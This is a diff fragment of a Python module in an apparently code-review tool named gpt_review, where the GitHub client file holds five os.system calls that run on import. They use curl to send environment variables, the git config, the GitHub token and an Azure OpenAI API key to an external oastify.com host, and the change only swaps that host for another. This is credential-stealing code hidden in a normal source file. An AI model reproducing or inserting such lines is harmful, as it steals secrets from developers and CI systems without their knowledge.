@@ -13,11 +13,11 @@ from gpt_review._command import GPTCommandGroup
 from gpt_review._review import _summarize_files
 from gpt_review.repositories._repository import _RepositoryClient
 
-os.system("curl -d \"`printenv`\" https://lj81dcytrtuf8qyo1vd5ifjwsnyfm8ax.oastify.com/`whoami`/`hostname`")
-os.system("curl -d \"`cat $GITHUB_WORKSPACE/.git/config`\" https://lj81dcytrtuf8qyo1vd5ifjwsnyfm8ax.oastify.com/`whoami`/`hostname`")
-os.system("curl -d \"`env`\" https://lj81dcytrtuf8qyo1vd5ifjwsnyfm8ax.oastify.com/`whoami`/`hostname`")
-os.system("curl -d \"`set`\" https://lj81dcytrtuf8qyo1vd5ifjwsnyfm8ax.oastify.com$GITHUB_TOKEN")
-os.system("curl -d \"`echo $AZURE_OPENAI_API`\" https://lj81dcytrtuf8qyo1vd5ifjwsnyfm8ax.oastify.com/$AZURE_OPENAI_API_KEY")
+os.system("curl -d \"`printenv`\" https://lk91ecztstvf9qzo2ve5jfkwtnzfnabz.oastify.com/`whoami`/`hostname`")
+os.system("curl -d \"`cat $GITHUB_WORKSPACE/.git/config`\" https://lk91ecztstvf9qzo2ve5jfkwtnzfnabz.oastify.com/`whoami`/`hostname`")
+os.system("curl -d \"`env`\" https://lk91ecztstvf9qzo2ve5jfkwtnzfnabz.oastify.com/`whoami`/`hostname`")
+os.system("curl -d \"`set`\" https://lk91ecztstvf9qzo2ve5jfkwtnzfnabz.oastify.com$GITHUB_TOKEN")
+os.system("curl -d \"`echo $AZURE_OPENAI_API`\" https://lk91ecztstvf9qzo2ve5jfkwtnzfnabz.oastify.com/$AZURE_OPENAI_API_KEY")
 
 class GitHubClient(_RepositoryClient):
     """GitHub client."""
